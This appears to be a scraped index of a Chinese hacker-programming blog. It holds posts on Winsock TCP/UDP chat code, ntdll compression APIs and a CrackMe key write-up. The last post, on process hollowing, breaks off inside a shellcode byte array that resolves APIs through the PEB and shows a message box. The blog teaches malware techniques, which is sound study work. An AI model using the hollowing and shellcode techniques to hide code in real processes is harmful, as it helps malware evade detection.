pszSend);&#125;UINT RecvThreadProc(LPVOID lpVoid) &#123; AcceptRecvMsg(); return 0;&#125; 客户端代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;//#include &lt;WinSock2.h&gt;#pragma comment(lib, &quot;Ws2_32.lib&quot;)SOCKET g_ServerSocket;BOOL Connection(char* lpszServerIP, int ServerPort);void SendMsg(char* pszSend);void RecvMsg();UINT RecvThreadProc(LPVOID lpVoid);int main()&#123; printf(&quot;请输入服务器IP\\n&quot;); char ipaddr[32] = &#123; 0 &#125;; gets_s(ipaddr); if (Connection(ipaddr, 12345) == FALSE) &#123; printf(&quot;建立连接失败\\n&quot;); getchar(); return -1; &#125; printf(&quot;建立连接成功，开始通信\\n&quot;); char szSend[MAX_PATH] = &#123; 0 &#125;; while (1) &#123; gets_s(szSend); SendMsg(szSend); &#125; return 0;&#125;BOOL Connection(char* lpszServerIP, int ServerPort)&#123; WSADATA wsaData = &#123; 0 &#125;; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); g_ServerSocket = socket(AF_INET, SOCK_STREAM, 0); if (g_ServerSocket == INVALID_SOCKET) &#123; return FALSE; &#125; sockaddr_in addr = &#123; 0 &#125;; addr.sin_family = AF_INET; addr.sin_port = htons(ServerPort); addr.sin_addr.S_un.S_addr = inet_addr(lpszServerIP); if (connect(g_ServerSocket, (sockaddr*)(&amp;addr), sizeof(addr))) &#123; return FALSE; &#125; CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)RecvThreadProc, NULL, NULL, NULL); return TRUE;&#125;void SendMsg(char* pszSend) &#123; send(g_ServerSocket, pszSend, (1 + strlen(pszSend)), 0); printf(&quot;发送消息：%s\\n&quot;,pszSend);&#125;void RecvMsg() &#123; char szBuffer[MAX_PATH] = &#123; 0 &#125;; while (1) &#123; int ret = recv(g_ServerSocket, szBuffer, MAX_PATH, 0); if (ret &lt;= 0) &#123; continue; &#125; printf(&quot;接收到消息：%s\\n&quot;, szBuffer); &#125;&#125;UINT RecvThreadProc(LPVOID lpVoid) &#123; RecvMsg(); return 0;&#125; 测试服务端 客户端 基于UDP Socket编程函数介绍sendto将数据发送到特定的目的地 12345678int sendto( SOCKET s, const char *buf, int len, int flags, const sockaddr *to, int tolen); s：标识套接字的描述符。 buf：指向要发送的数据缓冲区的指针。 len：由buf参数指向的数据长度。 flags：指定一组调用方式的标志，一般为0。 to：指向包含目标套接字地址的sockaddr结构的可选指针。 tolen：由to参数指向的地址的大小。 返回值：如果没有发生错误，返回发送的总字节数，否则返回SOCKET_ERROR。 recvfrom接收数据报并存储源地址 12345678int recvfrom( SOCKET s, char *buf, int len, int flags, sockaddr *from, int *fromlen); s：标识套接字的描述符。 buf：指定传入数据的缓冲区。 len：由buf参数指向的数据长度。 flags：指定一组调用方式的标志，一般为0。 from：指向sockaddr结构中的缓冲区的可选指针，它将在返回时保存源地址。 fromlen：由from参数指向的地址的大小。 返回值：如果没有发生错误，返回接收到的总字节数，否则返回SOCKET_ERROR。 实现原理UDP的通信框架比起TCP更加简单，UDP是基于无连接的通信，它可以直接使用sendto和recvfrom函数进行数据的发送与接收。 服务端：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354BOOL bind() &#123; WSADATA wsaData; WORD sockVersion = MAKEWORD(2, 2); if (WSAStartup(sockVersion, &amp;wsaData) != 0) &#123; return 0; &#125; serSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); if (serSocket == INVALID_SOCKET) &#123; printf(&quot;socket 错误\\n&quot;); return 0; &#125; sockaddr_in serAddr; serAddr.sin_family = AF_INET; serAddr.sin_port = htons(12345); serAddr.sin_addr.S_un.S_addr = inet_addr(&quot;IP地址&quot;); if (bind(serSocket, (sockaddr*)&amp;serAddr, sizeof(serAddr)) == SOCKET_ERROR) &#123; printf(&quot;绑定失败\\n&quot;); closesocket(serSocket); return 0; &#125; return 1;&#125;int main()&#123; if (bind() == FALSE) &#123; printf(&quot;wrong&quot;); return -1; &#125; printf(&quot;开始通信\\n&quot;); sockaddr_in remoteAddr; int nAddrLen = sizeof(remoteAddr); while (true) &#123; char recvData[MAX_PATH]; int ret = recvfrom(serSocket, recvData, MAX_PATH, 0, (sockaddr*)&amp;remoteAddr, &amp;nAddrLen); if (ret &gt; 0) &#123; recvData[ret] = 0x00; printf(&quot;接收到信息：%s\\n&quot;,recvData); &#125; char sendData[MAX_PATH] = &#123; 0 &#125;; gets_s(sendData); printf(&quot;发送数据：%s\\n&quot;, sendData); sendto(serSocket, sendData, strlen(sendData), 0, (sockaddr*)&amp;remoteAddr, nAddrLen); &#125; return 0;&#125; 服务端：12345678910111213141516171819202122232425262728293031323334353637383940BOOL bind() &#123; WORD socketVersion = MAKEWORD(2, 2); WSADATA wsaData; if (WSAStartup(socketVersion, &amp;wsaData) != 0) &#123; return 0; &#125; sclient = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); return 1;&#125;int main()&#123; if (bind() == FALSE) &#123; printf(&quot;wrong\\n&quot;); return -1; &#125; printf(&quot;开始通信\\n&quot;); sockaddr_in sin; sin.sin_family = AF_INET; sin.sin_port = htons(12345); sin.sin_addr.S_un.S_addr = inet_addr(&quot;IP地址&quot;); int len = sizeof(sin); while (1) &#123; char sendData[MAX_PATH] = &#123; 0 &#125;; gets_s(sendData); printf(&quot;发送数据：%s\\n&quot;, sendData); sendto(sclient, sendData, strlen(sendData), 0, (sockaddr*)&amp;sin, len); char recvData[MAX_PATH]; int ret = recvfrom(sclient, recvData, MAX_PATH, 0, (sockaddr*)&amp;sin, &amp;len); if (ret &gt; 0) &#123; recvData[ret] = 0x00; printf(&quot;接收到信息：%s\\n&quot;,recvData); &#125; &#125; return 0;&#125; 测试 参考《Windows黑客编程技术详解》","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"传输技术","slug":"传输技术","permalink":"https://b1ackie.cn/tags/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF/"},{"name":"SOCKET编程","slug":"SOCKET编程","permalink":"https://b1ackie.cn/tags/SOCKET%E7%BC%96%E7%A8%8B/"}]},{"title":"压缩技术-windows压缩API","slug":"压缩技术-windows压缩API","date":"2021-08-06T05:46:31.000Z","updated":"2021-08-09T10:51:56.697Z","comments":true,"path":"2021/08/06/压缩技术-windows压缩API/","link":"","permalink":"https://b1ackie.cn/2021/08/06/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF-windows%E5%8E%8B%E7%BC%A9API/","excerpt":"","text":"压缩技术为了实现windows上的数据压缩和解压缩，最方便的方法就是直接调用win32API函数。windows系统的ntdll专门提供了RtlCompressBuffer和RtlDecompressBuffer函数来负责数据压缩和解压缩操作。 函数介绍RtlGetCompressionWorkSpaceSize确定RtlCompressBuffer和RtlDecompressBuffer函数工作空间缓冲区的正确大小。 12345NT_RTL_COMPRESS_API NTSTATUS RtlGetCompressionWorkSpaceSize( USHORT CompressionFormatAndEngine, PULONG CompressBufferWorkSpaceSize, PULONG CompressFragmentWorkSpaceSize); CompressionFormatAndEngine：指定压缩格式和引擎类型。该参数必须设置为以下组合之一： COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM CompressBufferWorkSpaceSize：指向调用者分配的缓冲区指针，用于接受压缩缓冲区所需的大小。此值可确定RtlCompressBuffer的工作空间缓冲区的正确大小。 CompressFragmentWorkSpaceSize：一个指向可调用者分配缓冲区的指针，用于接收将压缩缓冲区解压缩为片段所需的大小。此值用于确定RtlDecompressFragment的工作空间缓冲区的正确大小。 返回值：返回STATUS_SUCCESS成功，否则失败。 RtlCompressBuffer压缩一个可以由文件系统驱动程序使用的缓冲区，以促进文件压缩的实现。 12345678910NT_RTL_COMPRESS_API NTSTATUS RtlCompressBuffer( USHORT CompressionFormatAndEngine, PUCHAR UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG CompressedBufferSize, ULONG UncompressedChunkSize, PULONG FinalCompressedSize, PVOID WorkSpace); CompressionFormatAndEngine：指定压缩格式和引擎类型的位掩码，此参数必须设置为一种格式类型和一种引擎类型的有效按位或组合。相关值得含义如下： 值 含义 COMPRESSION_FORMAT_LZNT1 LZ压缩算法 COMPRESSION_FORMAT_XPRESS Xpress压缩算法 COMPRESSION_FORMAT_XPRESS_HUFF Huffman压缩算法 COMPRESSION_ENGINE_STANDARD 标准压缩算法 COMPRESSION_ENGINE_MAXIMUM 最大程序压缩 UncompressedBuffer：指向要压缩的数据缓冲区的指针。该参数为必须不可为空。 UncompressedBufferSize：指定UncompressedBuffer缓冲区的大小 CompressedBuffer：指向压缩之后数据缓冲区的指针，用于接收压缩数据。该参数为必须的不可以为空。 CompressedBufferSize：指定CompressedBuffer缓冲区的大小。 UncompressedChunkSize：指定压缩UncompressedBuffer缓冲区时使用块的大小。该参数必须是以下值之一：512、1024、2048或者4096。操作系统使用4096，因此此参数推荐值也是、4096。 FinalCompressedSize 指向调用者分配变量的指针，该变量接收存储在CompressedBuffer中的压缩数据的大小。该参数为必须的，不能为NULL。 WorkSpace：在压缩期间指定由RtlCompressBuffer函数使用的调用者分配的工作空间缓冲区的指针。使用RtlGetCompressionWorkSpaceSize函数可以确定工作缓冲区的正确大小。 返回值：返回STATUS_SUNCCESS表示成功，否则失败。 RtlDecompressBuffer解压缩整个压缩缓冲区 12345678NT_RTL_COMPRESS_API NTSTATUS RtlDecompressBuffer( USHORT CompressionFormat, PUCHAR UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG CompressedBufferSize, PULONG FinalUncompressedSize); CompressionFormat：指定压缩缓冲区中压缩格式的位掩码。该参数必须设置为COMPRESSION_FORMAT_LZNT1。它和其他相关压缩格式的含义如下： 值 含义 COMPRESSION_FORMAT_LZNT1 LZ压缩算法 COMPRESSION_FORMAT_XPRESS Xpress压缩算法 UncompressedBuffer：指向存储解压缩数据的缓冲区指针，该缓冲区从CompressedBuffer接收解压缩数据。该参数是必须的，不可以为NULL。 UncompressedBufferSize：指定UncompressedBuffer缓冲区的大小。 CompressedBuffer：指向要解压缩的数据缓冲区的指针。该参数是必须的不可以为空。 CompressedBufferSize：指定CompressedBuffer缓冲区的大小。 FinalUncompressedSize：指向解压之后得到的数据大小的指针，该变量接收在UncompressedBuffer中存储的解压缩数据的大小。该参数是必须的，不能为NULL。 返回值：返回STATUS_SUCCESS则表示成功，否则失败。 编码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;BOOL CompressData(BYTE* pUnCompressData, DWORD dwUncompressDataLen, BYTE** ppCompressData, DWORD* pdwCompressDataLen);BOOL DeCompressData(BYTE* pCompressData, DWORD dwCompressDataLen, BYTE** ppUnCompressData, DWORD* pdwUncompressDataLen);typedef NTSTATUS (WINAPI * FN_RtlGetCompressionWorkSpaceSize)( USHORT CompressionFormatAndEngine, PULONG CompressBufferWorkSpaceSize, PULONG CompressFragmentWorkSpaceSize);typedef NTSTATUS (WINAPI* FN_RtlCompressBuffer)( USHORT CompressionFormatAndEngine, PUCHAR UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG CompressedBufferSize, ULONG UncompressedChunkSize, PULONG FinalCompressedSize, PVOID WorkSpace );typedef NTSTATUS (WINAPI* FN_RtlDecompressBuffer)( USHORT CompressionFormat, PUCHAR UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG CompressedBufferSize, PULONG FinalUncompressedSize);int main() &#123; DWORD i = 0; BOOL flag = FALSE; char buffer[] = &quot;b1ackie&quot;; DWORD dwBufferLen = strlen(buffer); BYTE* pCompressData = NULL; DWORD dwCompreeDataLen = 0; BYTE* pUnCompressData = NULL; DWORD dwUnCompressDataLen = 0; CompressData((BYTE*)buffer, dwBufferLen, &amp;pCompressData, &amp;dwCompreeDataLen); DeCompressData(pCompressData, dwCompreeDataLen, &amp;pUnCompressData, &amp;dwUnCompressDataLen); printf(&quot;原始数据：\\n&quot;); for (int i = 0; i &lt; dwBufferLen; i++) &#123; printf(&quot;%x &quot;, buffer[i]); &#125; printf(&quot;\\n加密后数据：\\n&quot;); for (int i = 0; i &lt; dwCompreeDataLen; i++) &#123; printf(&quot;%x &quot;, pCompressData[i]); &#125; printf(&quot;\\n解密后数据\\n&quot;); for (int i = 0; i &lt; dwUnCompressDataLen; i++) &#123; printf(&quot;%x &quot;, pUnCompressData[i]); &#125; if (pUnCompressData) &#123; delete[]pUnCompressData; pUnCompressData = NULL; &#125; if (pCompressData) &#123; delete[]pCompressData; pCompressData = NULL; &#125; getchar(); return 0;&#125;BOOL CompressData(BYTE* pUnCompressData, DWORD dwUncompressDataLen, BYTE** ppCompressData, DWORD* pdwCompressDataLen)&#123; BOOL flag = FALSE; NTSTATUS status = 0; DWORD dwWorkSpaceSize = 0; DWORD dwFragmentWorkSpaceSize = 0; BYTE* pWorkSpace = NULL; BYTE* pCompressData = NULL; DWORD dwCompressDataLen = 4096; DWORD dwFinalCompressSize = 0; HMODULE hDll = NULL; do &#123; hDll = LoadLibraryA(&quot;ntdll.dll&quot;); if (hDll == NULL) &#123; printf(&quot;加载NTDLL失败\\n&quot;); break; &#125; FN_RtlGetCompressionWorkSpaceSize RtlGetCompressionWorkSpaceSize = (FN_RtlGetCompressionWorkSpaceSize)GetProcAddress(hDll, &quot;RtlGetCompressionWorkSpaceSize&quot;); if (RtlGetCompressionWorkSpaceSize == NULL) &#123; printf(&quot;获取RtlGetCompressionWorkSpaceSize函数地址失败\\n&quot;); break; &#125; FN_RtlCompressBuffer RtlCompressBuffer = (FN_RtlCompressBuffer)GetProcAddress(hDll, &quot;RtlCompressBuffer&quot;); if (RtlCompressBuffer == NULL) &#123; printf(&quot;获取RtlCompressBuffer地址失败\\n&quot;); break; &#125; //获取WORKSPACE的大小 status = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD, &amp;dwWorkSpaceSize, &amp;dwFragmentWorkSpaceSize); if (status!=0) &#123; printf(&quot;获取workspace大小失败\\n&quot;); break; &#125; pWorkSpace = new BYTE[dwWorkSpaceSize]; if (pWorkSpace == NULL) &#123; printf(&quot;1申请内存失败\\n&quot;); break; &#125; RtlZeroMemory(pWorkSpace, dwWorkSpaceSize); while (TRUE) &#123; pCompressData = new BYTE[dwCompressDataLen]; if (pCompressData == NULL) &#123; printf(&quot;2申请内存失败\\n&quot;); break; &#125; RtlZeroMemory(pCompressData, dwCompressDataLen); //压缩数据 RtlCompressBuffer(COMPRESSION_FORMAT_LZNT1, pUnCompressData, dwUncompressDataLen, pCompressData, dwCompressDataLen, 4096, &amp;dwFinalCompressSize, (PVOID)pWorkSpace); if (dwCompressDataLen &lt; dwFinalCompressSize) &#123; if (pCompressData) &#123; delete[]pCompressData; pCompressData = NULL; &#125; dwCompressDataLen = dwFinalCompressSize; &#125; else &#123; break; &#125; &#125; *ppCompressData = pCompressData; *pdwCompressDataLen = dwFinalCompressSize; flag = TRUE; &#125;while(FALSE); if(pWorkSpace) &#123; delete[]pWorkSpace; pWorkSpace = NULL; &#125; if (hDll) &#123; FreeLibrary(hDll); &#125; return flag;&#125;BOOL DeCompressData(BYTE* pCompressData, DWORD dwCompressDataLen, BYTE** ppUnCompressData, DWORD* pdwUncompressDataLen)&#123; BOOL flag = FALSE; HMODULE hDll = NULL; BYTE* pUnCompressData = NULL; DWORD dwUnCompressDataLen = 4096; DWORD dwFinalUnCompressSize = 0; do &#123; hDll = LoadLibraryA(&quot;ntdll.dll&quot;); if (hDll == NULL) &#123; printf(&quot;加载NTDLL失败\\n&quot;); break; &#125; FN_RtlDecompressBuffer RtlDecompressBuffer = (FN_RtlDecompressBuffer)GetProcAddress(hDll, &quot;RtlDecompressBuffer&quot;); if (RtlDecompressBuffer == NULL) &#123; printf(&quot;获取RtlDecompressBuffer地址失败\\n&quot;); break; &#125; while (TRUE) &#123; pUnCompressData = new BYTE[dwUnCompressDataLen]; if (pUnCompressData == NULL) &#123; printf(&quot;3申请内存失败\\n&quot;); break; &#125; RtlZeroMemory(pUnCompressData, dwUnCompressDataLen); RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, pUnCompressData, dwUnCompressDataLen, pCompressData, dwCompressDataLen, &amp;dwFinalUnCompressSize); if (dwUnCompressDataLen &lt; dwFinalUnCompressSize) &#123; if (pUnCompressData) &#123; delete[]pUnCompressData; pUnCompressData = NULL; &#125; dwUnCompressDataLen = dwFinalUnCompressSize; &#125; else &#123; break; &#125; &#125; *ppUnCompressData = pUnCompressData; *pdwUncompressDataLen = dwFinalUnCompressSize; flag = TRUE; &#125; while (FALSE); if (hDll) &#123; FreeLibrary(hDll); &#125; return flag;&#125; 参考《Windows黑客编程技术详解》","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"压缩技术","slug":"压缩技术","permalink":"https://b1ackie.cn/tags/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF/"}]},{"title":"160CrackMe-008","slug":"160CrackMe-008","date":"2021-08-04T09:38:43.000Z","updated":"2021-08-09T10:54:15.567Z","comments":true,"path":"2021/08/04/160CrackMe-008/","link":"","permalink":"https://b1ackie.cn/2021/08/04/160CrackMe-008/","excerpt":"","text":"初探打开程序直接输入一个注册码，输入错误弹出错误提示窗口。 分析无壳，是使用VB编写的的 使用OD直接搜索错误弹窗的提示，可以直接定位一个关键跳转。 开始分析一下，就在上面不远处，是明文比较输入与SynTaX 2oo1 输入SynTaX 2oo1即可成功 总结有点简单了。。。","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/tags/CrackMe/"}]},{"title":"隐藏技术-傀儡进程","slug":"隐藏技术-傀儡进程","date":"2021-08-03T09:37:27.000Z","updated":"2021-08-09T10:52:31.783Z","comments":true,"path":"2021/08/03/隐藏技术-傀儡进程/","link":"","permalink":"https://b1ackie.cn/2021/08/03/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/","excerpt":"","text":"傀儡进程借着正常的软件进程或者系统进程的外壳来进行恶意的操作。 函数介绍GetThreadContext检索指定线程的上下文 64位程序可以使用Wow64GetThreadContext检索WOW64线程的上下文。 1234BOOL GetThreadContext( HANDLE hThread, LPCONTEXT lpContext); hThread：要检索其上下文的线程的句柄。句柄必须有THREAD_GET_CONTEXT访问权限。 lpContext：指向上下文结构的指针，它接受指定线程适当的上下文。该结构中的ContextFlags成员可以指定检索线程上下文的哪些部分。上下文结构具有高度的处理器特性。 返回值：成功返回不为0，否则为0。 SetThreadContext设置指定线程的上下文。64位可以用Wow64SetThreadContext设置 1234BOOL SetThreadContext( HANDLE hThread, const CONTEXT *lpContext); hThread：指定线程的句柄，并将设置其上下文。该句柄必须具有线程的THREAD_SET_CONTEXT权限。 lpContext：指向要在指定进程中设置上下文结构的指针。此结构中ContextFlags成员值可以指定要设置线程上下文的哪些部分。 返回值：如果设置了上下文，则返回值为非0，否则为0； ResumeThread减少线程的暂停计数。当暂停计数减到0时，恢复线程的执行。 123DWORD ResumeThread( HANDLE hThread); hThread：要重新启动线程的句柄。该句柄必须具有THREAD_SUSPEND_RESUME权限。 返回值：如果成功，返回值是线程先前挂起的计数，如果失败，则返回（DWORD）-1。 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;BOOL ReplacProcess(char* pszFilePath);char data[] = &#123; 0x55 ,0x8B ,0xEC ,0x83 ,0xEC ,0x4C ,0xE8 ,0x15 ,0x01 ,0x00 ,0x00 ,0x89 ,0x45 ,0xFC ,0x8B ,0x45 ,0xFC ,0x50 ,0xE8 ,0x29 ,0x01 ,0x00 ,0x00 ,0x83 ,0xC4 ,0x04 ,0x89 ,0x45 ,0xF8 ,0xC6 ,0x45 ,0xB4 ,0x4C ,0xC6 ,0x45 ,0xB5 ,0x6F ,0xC6 ,0x45 ,0xB6 ,0x61 ,0xC6 ,0x45 ,0xB7 ,0x64 ,0xC6 ,0x45 ,0xB8 ,0x4C ,0xC6 ,0x45 ,0xB9 ,0x69 ,0xC6 ,0x45 ,0xBA ,0x62 ,0xC6 ,0x45 ,0xBB ,0x72 ,0xC6 ,0x45 ,0xBC ,0x61 ,0xC6 ,0x45 ,0xBD ,0x72 ,0xC6 ,0x45 ,0xBE ,0x79 ,0xC6 ,0x45 ,0xBF ,0x41 ,0xC6 ,0x45 ,0xC0 ,0x00 ,0x8D ,0x4D ,0xB4 ,0x51 ,0x8B ,0x55 ,0xFC ,0x52 ,0xFF ,0x55 ,0xF8 ,0x89 ,0x45 ,0xF4 ,0xC6 ,0x45 ,0xC4 ,0x4D ,0xC6 ,0x45 ,0xC5 ,0x65 ,0xC6 ,0x45 ,0xC6 ,0x73 ,0xC6 ,0x45 ,0xC7 ,0x73 ,0xC6 ,0x45 ,0xC8 ,0x61 ,0xC6 ,0x45 ,0xC9 ,0x67 ,0xC6 ,0x45 ,0xCA ,0x65 ,0xC6 ,0x45 ,0xCB ,0x42 ,0xC6 ,0x45 ,0xCC ,0x6F ,0xC6 ,0x45 ,0xCD ,0x78 ,0xC6 ,0x45 ,0xCE ,0x41 ,0xC6 ,0x45 ,0xCF ,0x00 ,0xC6 ,0x45 ,0xD0 ,0x55 ,0xC6 ,0x45 ,0xD1 ,0x73 ,0xC6 ,0x45 ,0xD2 ,0x65 ,0xC6 ,0x45 ,0xD3 ,0x72 ,0xC6 ,0x45 ,0xD4 ,0x33 ,0xC6 ,0x45 ,0xD5 ,0x32 ,0xC6 ,0x45 ,0xD6 ,0x2E ,0xC6 ,0x45 ,0xD7 ,0x64 ,0xC6 ,0x45 ,0xD8 ,0x6C ,0xC6 ,0x45 ,0xD9 ,0x6C ,0xC6 ,0x45 ,0xDA ,0x00 ,0x8D ,0x45 ,0xC4 ,0x50 ,0x8D ,0x4D ,0xD0 ,0x51 ,0xFF ,0x55 ,0xF4 ,0x50 ,0xFF ,0x55 ,0xF8 ,0x89 ,0x45 ,0xF0 ,0xC6 ,0x45 ,0xDC ,0x62 ,0xC6 ,0x45 ,0xDD ,0x31 ,0xC6 ,0x45 ,0xDE ,0x61 ,0xC6 ,0x45 ,0xDF ,0x63 ,0xC6 ,0x45 ,0xE0 ,0x6B ,0xC6 ,0x45 ,0xE1 ,0x69 ,0xC6 ,0x45 ,0xE2 ,0x65 ,0xC6 ,0x45 ,0xE3 ,0x21 ,0xC6 ,0x45 ,0xE4 ,0x00 ,0xC6 ,0x45 ,0xE8 ,0x74 ,0xC6 ,0x45 ,0xE9 ,0x65 ,0xC6 ,0x45 ,0xEA ,0x73 ,0xC6 ,0x45 ,0xEB ,0x74 ,0xC6 ,0x45 ,0xEC ,0x00 ,0x6A ,0x00 ,0x8D ,0x55 ,0xE8 ,0x52 ,0x8D ,0x45 ,0xDC ,0x50 ,0x6A ,0x00 ,0xFF ,0x55 ,0xF0 ,0x33 ,0xC0 ,0x8B ,0xE5 ,0x5D ,0xC3 ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0x64 ,0xA1 ,0x30 ,0x00 ,0x00 ,0x00 ,0x8B ,0x40 ,0x0C ,0x8B ,0x40 ,0x14 ,0x8B ,0x00 ,0x8B ,0x00 ,0x8B ,0x40 ,0x10 ,0xC3 ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0x55 ,0x8B ,0xEC ,0x83 ,0xEC ,0x2C ,0x8B ,0x45 ,0x08 ,0x89 ,0x45 ,0xF8 ,0x8B ,0x4D ,0xF8 ,0x8B ,0x55 ,0xF8 ,0x03 ,0x51 ,0x3C ,0x89 ,0x55 ,0xE8 ,0xB8 ,0x08 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC8 ,0x00 ,0x8B ,0x55 ,0xE8 ,0x8B ,0x45 ,0xF8 ,0x03 ,0x44 ,0x0A ,0x78 ,0x89 ,0x45 ,0xF0 ,0x8B ,0x4D ,0xF0 ,0x8B ,0x55 ,0xF8 ,0x03 ,0x51 ,0x20 ,0x89 ,0x55 ,0xE0 ,0x8B ,0x45 ,0xF0 ,0x8B ,0x4D ,0xF8 ,0x03 ,0x48 ,0x24 ,0x89 ,0x4D ,0xDC ,0x8B ,0x55 ,0xF0 ,0x8B ,0x45 ,0xF8 ,0x03 ,0x42 ,0x1C ,0x89 ,0x45 ,0xD8 ,0x8B ,0x4D ,0xF0 ,0x8B ,0x51 ,0x18 ,0x89 ,0x55 ,0xE4 ,0xC7 ,0x45 ,0xEC ,0x00 ,0x00 ,0x00 ,0x00 ,0xC7 ,0x45 ,0xF4 ,0x00 ,0x00 ,0x00 ,0x00 ,0xEB ,0x09 ,0x8B ,0x45 ,0xF4 ,0x83 ,0xC0 ,0x01 ,0x89 ,0x45 ,0xF4 ,0x8B ,0x4D ,0xF4 ,0x3B ,0x4D ,0xE4 ,0x0F ,0x83 ,0x6D ,0x01 ,0x00 ,0x00 ,0x8B ,0x55 ,0xF4 ,0x8B ,0x45 ,0xE0 ,0x8B ,0x4D ,0xF8 ,0x03 ,0x0C ,0x90 ,0x89 ,0x4D ,0xFC ,0xBA ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC2 ,0x00 ,0x8B ,0x4D ,0xFC ,0x0F ,0xBE ,0x14 ,0x01 ,0x83 ,0xFA ,0x47 ,0x0F ,0x85 ,0x41 ,0x01 ,0x00 ,0x00 ,0xB8 ,0x01 ,0x00 ,0x00 ,0x00 ,0xC1 ,0xE0 ,0x00 ,0x8B ,0x4D ,0xFC ,0x0F ,0xBE ,0x14 ,0x01 ,0x83 ,0xFA ,0x65 ,0x0F ,0x85 ,0x29 ,0x01 ,0x00 ,0x00 ,0xB8 ,0x01 ,0x00 ,0x00 ,0x00 ,0xD1 ,0xE0 ,0x8B ,0x4D ,0xFC ,0x0F ,0xBE ,0x14 ,0x01 ,0x83 ,0xFA ,0x74 ,0x0F ,0x85 ,0x12 ,0x01 ,0x00 ,0x00 ,0xB8 ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC8 ,0x03 ,0x8B ,0x55 ,0xFC ,0x0F ,0xBE ,0x04 ,0x0A ,0x83 ,0xF8 ,0x50 ,0x0F ,0x85 ,0xFA ,0x00 ,0x00 ,0x00 ,0xB9 ,0x01 ,0x00 ,0x00 ,0x00 ,0xC1 ,0xE1 ,0x02 ,0x8B ,0x55 ,0xFC ,0x0F ,0xBE ,0x04 ,0x0A ,0x83 ,0xF8 ,0x72 ,0x0F ,0x85 ,0xE2 ,0x00 ,0x00 ,0x00 ,0xB9 ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xD1 ,0x05 ,0x8B ,0x45 ,0xFC ,0x0F ,0xBE ,0x0C ,0x10 ,0x83 ,0xF9 ,0x6F ,0x0F ,0x85 ,0xCA ,0x00 ,0x00 ,0x00 ,0xBA ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC2 ,0x06 ,0x8B ,0x4D ,0xFC ,0x0F ,0xBE ,0x14 ,0x01 ,0x83 ,0xFA ,0x63 ,0x0F ,0x85 ,0xB2 ,0x00 ,0x00 ,0x00 ,0xB8 ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC8 ,0x07 ,0x8B ,0x55 ,0xFC ,0x0F ,0xBE ,0x04 ,0x0A ,0x83 ,0xF8 ,0x41 ,0x0F ,0x85 ,0x9A ,0x00 ,0x00 ,0x00 ,0xB9 ,0x01 ,0x00 ,0x00 ,0x00 ,0xC1 ,0xE1 ,0x03 ,0x8B ,0x55 ,0xFC ,0x0F ,0xBE ,0x04 ,0x0A ,0x83 ,0xF8 ,0x64 ,0x0F ,0x85 ,0x82 ,0x00 ,0x00 ,0x00 ,0xB9 ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xD1 ,0x09 ,0x8B ,0x45 ,0xFC ,0x0F ,0xBE ,0x0C ,0x10 ,0x83 